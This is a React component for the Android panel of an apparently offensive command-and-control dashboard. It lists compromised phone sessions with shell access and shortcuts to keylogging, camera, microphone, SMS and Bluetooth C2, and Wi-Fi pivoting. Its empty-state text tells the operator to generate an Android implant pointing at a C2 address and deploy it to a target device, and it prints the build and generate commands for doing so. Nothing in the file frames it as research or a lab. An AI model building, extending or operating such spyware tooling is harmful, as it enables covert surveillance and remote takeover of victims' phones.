import { useAPI } from '../hooks/useAPI'
import type { Session } from '../types'
import { Smartphone, RefreshCw, Terminal, Wifi, Bluetooth, MessageSquare, Mic, Camera, Key } from 'lucide-react'

interface Props {
  onOpenTerminal: (sessionID: string, sessionName: string) => void
}

const CAPABILITIES = [
  { icon: Wifi,          label: 'WiFi Pivot',       color: 'text-primary' },
  { icon: Bluetooth,     label: 'BLE C2',            color: 'text-accent' },
  { icon: MessageSquare, label: 'SMS C2',             color: 'text-warn' },
  { icon: Mic,           label: 'Audio',              color: 'text-danger' },
  { icon: Camera,        label: 'Camera',             color: 'text-purple' },
  { icon: Key,           label: 'Keylogger',          color: 'text-warn' },
]

export default function Android({ onOpenTerminal }: Props) {
  const { data, loading, error, refresh } = useAPI<Session[]>('/api/sessions', 8_000)

  // Filter only Android sessions
  const androidSessions = (data ?? []).filter(s =>
    s.os?.toLowerCase().includes('android') ||
    s.arch?.toLowerCase().includes('arm')
  )

  const allSessions = data ?? []
  const androidCount = androidSessions.length

  return (
    <div className="flex flex-col gap-6 h-full">

      {/* ── Header ──────────────────────────────────────────────────────── */}
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-primary font-bold text-lg flex items-center gap-2">
            <Smartphone size={18} /> Android
            <span className="text-muted text-sm font-normal">({androidCount} device{androidCount !== 1 ? 's' : ''})</span>
          </h2>
          <p className="text-muted text-xs mt-1">Phantom Mobile Engine — 50+ capabilities</p>
        </div>
        <button onClick={refresh}
          className="flex items-center gap-1 text-muted hover:text-text text-xs px-2 py-1 rounded border border-border hover:border-muted transition-colors">
          <RefreshCw size={12} /> Refresh
        </button>
      </div>

      {error && <div className="text-danger text-xs bg-danger/10 border border-danger/30 rounded p-2">{error}</div>}

      {/* ── Capability matrix ───────────────────────────────────────────── */}
      <div className="grid grid-cols-3 md:grid-cols-6 gap-2">
        {CAPABILITIES.map(cap => (
          <div key={cap.label} className="rounded-lg border border-border bg-surface p-3 flex flex-col items-center gap-1.5">
            <cap.icon size={16} className={cap.color} />
            <span className="text-[10px] text-muted text-center">{cap.label}</span>
          </div>
        ))}
      </div>

      {/* ── Active Android Sessions ──────────────────────────────────────── */}
      <div className="flex flex-col gap-3">
        <h3 className="text-xs uppercase tracking-widest text-muted">Active Android Devices</h3>

        {loading && androidCount === 0 ? (
          <div className="text-muted text-sm">Loading…</div>
        ) : androidCount === 0 ? (
          <div className="flex flex-col items-center justify-center gap-4 py-12 text-center">
            <Smartphone size={40} className="text-border" />
            <div>
              <p className="text-muted text-sm">No Android devices connected.</p>
              <p className="text-muted text-xs mt-1">Generate an Android implant and deploy it to a target device.</p>
            </div>
            <div className="text-xs text-muted bg-surface border border-border rounded p-3 font-mono text-left">
              <div className="text-accent mb-1"># Generate Android implant</div>
              <div>make android-arm64</div>
              <div className="text-accent mt-2 mb-1"># Or from server console</div>
              <div>sudosoc {'>'} generate --mtls {'<'}C2_IP{'>'} --os android --arch arm64</div>
            </div>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {androidSessions.map(s => (
              <div key={s.id} className="rounded-lg border border-border bg-surface p-4 flex flex-col gap-3">

                {/* Device header */}
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className={`w-2 h-2 rounded-full ${s.is_dead ? 'bg-danger' : 'bg-primary animate-pulse'}`} />
                    <span className="text-primary font-bold text-sm">{s.name}</span>
                  </div>
                  <span className="text-muted text-[10px]">{s.id.slice(0, 8)}</span>
                </div>

                {/* Device info */}
                <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-xs">
                  <div><span className="text-muted">Host </span><span className="text-text">{s.hostname}</span></div>
                  <div><span className="text-muted">User </span><span className="text-accent">{s.username}</span></div>
                  <div><span className="text-muted">OS   </span><span className="text-text">{s.os}/{s.arch}</span></div>
                  <div><span className="text-muted">C2   </span><span className="text-text">{s.transport}</span></div>
                  <div><span className="text-muted">Addr </span><span className="text-muted">{s.remote_address}</span></div>
                  <div><span className="text-muted">PID  </span><span className="text-muted">{s.pid}</span></div>
                </div>

                {/* Android capability shortcuts */}
                <div className="grid grid-cols-3 gap-1.5">
                  {CAPABILITIES.map(cap => (
                    <button key={cap.label}
                      onClick={() => onOpenTerminal(s.id, s.name)}
                      className="flex items-center gap-1 px-2 py-1 rounded text-[10px] border border-border hover:border-primary/40 hover:bg-primary/5 transition-colors"
                    >
                      <cap.icon size={10} className={cap.color} />
                      <span className="text-muted">{cap.label}</span>
                    </button>
                  ))}
                </div>

                {/* Terminal button */}
                <button onClick={() => onOpenTerminal(s.id, s.name)}
                  className="flex items-center justify-center gap-1.5 w-full py-1.5 rounded border border-primary/30 text-primary hover:bg-primary/10 transition-colors text-xs">
                  <Terminal size={12} /> Open Shell
                </button>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* ── Stats footer ────────────────────────────────────────────────── */}
      <div className="flex gap-4 text-xs text-muted mt-auto pt-4 border-t border-border">
        <span>Total sessions: <span className="text-text">{allSessions.length}</span></span>
        <span>Android: <span className="text-primary">{androidCount}</span></span>
        <span>Other: <span className="text-text">{allSessions.length - androidCount}</span></span>
      </div>
    </div>
  )
}
